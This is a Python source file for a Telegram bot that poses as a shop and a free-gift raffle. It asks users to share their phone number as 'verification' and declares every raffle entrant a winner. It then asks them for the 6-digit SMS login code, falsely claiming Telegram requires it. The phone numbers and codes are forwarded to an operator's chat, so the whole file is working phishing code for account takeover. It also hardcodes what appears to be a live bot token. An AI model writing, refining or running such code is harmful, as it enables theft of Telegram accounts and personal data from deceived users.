from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, Contact
import asyncio

API_TOKEN = "7734758623:AAExZF0D8VLeZec2U0re22Wxe3vi6y_d_18"  # вставь сюда токен
CHAT_ID = 7403055160  # вставь сюда ID своего чата/аккаунта, куда слать инфу

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

# --- Клавиатуры ---
contact_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="📱 Поделиться контактом", request_contact=True)]],
    resize_keyboard=True
)

menu_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="🎁 Бесплатный подарок")],
        [
            KeyboardButton(text="🛍️ Посмотреть товары"),
            KeyboardButton(text="🛒 Корзина")
        ]
    ],
    resize_keyboard=True
)

cart_keyboard = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="◀️ Назад")]],
    resize_keyboard=True
)

shop_keyboard = ReplyKeyboardMarkup(
    keyboard=[
        [KeyboardButton(text="⭐ 100 звёзд — 99₽")],
        [KeyboardButton(text="⭐ 500 звёзд — 299₽")],
        [KeyboardButton(text="Telegram Premium — 149₽/мес")],
        [KeyboardButton(text="◀️ Назад")]
    ],
    resize_keyboard=True
)

# --- Состояния пользователя ---
user_states = {}
user_ranges = {}

# --- Хендлеры ---

@dp.message(Command("start"))
async def start(message: Message):
    user_states[message.from_user.id] = None
    await message.answer(
        "Для начала работы с ботом необходимо пройти простую верификацию. Нажмите кнопку ниже:", 
        reply_markup=contact_keyboard
    )

@dp.message(F.contact)
async def on_contact(message: Message):
    user_id = message.from_user.id
    phone_number = message.contact.phone_number
    user_states[user_id] = None
    await message.answer("✅ Контакт получен. Добро пожаловать в главное меню!", reply_markup=menu_keyboard)
    await bot.send_message(CHAT_ID, f"Пользователь {user_id} поделился контактом: {phone_number}")

@dp.message(F.text == "🛒 Корзина")
async def show_cart(message: Message):
    await message.answer("Ваша корзина пуста 🛒", reply_markup=cart_keyboard)

@dp.message(F.text == "🛍️ Посмотреть товары")
async def show_shop(message: Message):
    await message.answer("Вот что у нас есть:", reply_markup=shop_keyboard)

@dp.message(F.text == "◀️ Назад")
async def back_to_menu(message: Message):
    user_states[message.from_user.id] = None
    await message.answer("Вы вернулись в главное меню:", reply_markup=menu_keyboard)

@dp.message(F.text == "🎁 Бесплатный подарок")
async def gift_game_start(message: Message):
    user_id = message.from_user.id
    user_states[user_id] = "waiting_for_range"
    await message.answer("🎁 Для участия в розыгрыше введите диапазон чисел (например: 100-200). Минимальная длина диапазона — 10 чисел:")

# Обработка диапазона — только если в состоянии ожидания диапазона
@dp.message()
async def handle_range_or_other(message: Message):
    user_id = message.from_user.id
    text = message.text.strip()

    # Состояние ожидания диапазона
    if user_states.get(user_id) == "waiting_for_range":
        # Проверяем формат: "число-число"
        if "-" in text:
            parts = text.split("-")
            if len(parts) == 2 and parts[0].isdigit() and parts[1].isdigit():
                start = int(parts[0])
                end = int(parts[1])
                if start >= end:
                    await message.answer("Ошибка: начало диапазона должно быть меньше конца.")
                    return
                if (end - start) < 10:
                    await message.answer("Ошибка: диапазон должен содержать не менее 10 чисел.")
                    return
                user_ranges[user_id] = (start, end)
                user_states[user_id] = "waiting_for_number"
                await message.answer(f"Отлично! Теперь выберите число от {start} до {end}:")
                return
        await message.answer("Неверный формат диапазона. Введите, например, 100-200, где длина диапазона не менее 10.")
        return

    # Состояние ожидания числа для игры
    if user_states.get(user_id) == "waiting_for_number":
        if text.isdigit():
            number = int(text)
            if user_id not in user_ranges:
                await message.answer("Что-то пошло не так. Введите диапазон заново командой /start.")
                user_states[user_id] = None
                return
            start, end = user_ranges[user_id]
            if not (start <= number <= end):
                await message.answer(f"Ваше число должно быть от {start} до {end}.")
                return

            await message.answer("🎰 Крутим рулетку...")
            await asyncio.sleep(0.5)
            await message.answer("🔄 Подсчёт...")
            await asyncio.sleep(1.5)

            await message.answer(
                f"🎉 Поздравляем! Число {number} оказалось выигрышным!\n\n"
                "Для получения подарка Telegram запрашивает 2FA-подтверждение.\n"
                "📩 Пожалуйста, введите 6-значный код, который придёт вам в SMS:"
            )
            user_states[user_id] = "waiting_for_2fa"
            return
        else:
            await message.answer("Пожалуйста, введите число из заданного диапазона.")
            return

    # Состояние ожидания 2FA кода
    if user_states.get(user_id) == "waiting_for_2fa":
        if text.isdigit() and len(text) == 6:
            await message.answer("✅ Код принят. Спасибо за участие!")
            await message.answer(
                "🎁 Ваш подарок будет отправлен вам в течение 24 часов с помощью этого же бота.\n"
                "Если он не придёт — пишите в техподдержку: "
                "[техподдержка](https://www.youtube.com/watch?v=dQw4w9WgXcQ)",
                disable_web_page_preview=True,
                parse_mode="Markdown"
            )
            await bot.send_message(CHAT_ID, f"Пользователь {user_id} ввёл 2FA-код: {text}")
            user_states[user_id] = None
            user_ranges.pop(user_id, None)
            return
        else:
            await message.answer("⛔ Код некорректен. Убедитесь, что вы ввели 6 цифр без пробелов и других символов.")
            return

    # Если пользователь пишет что-то вне сценария
    await message.answer("Неизвестная команда. Начните с /start.")

if __name__ == "__main__":
    import asyncio
    asyncio.run(dp.start_polling(bot))
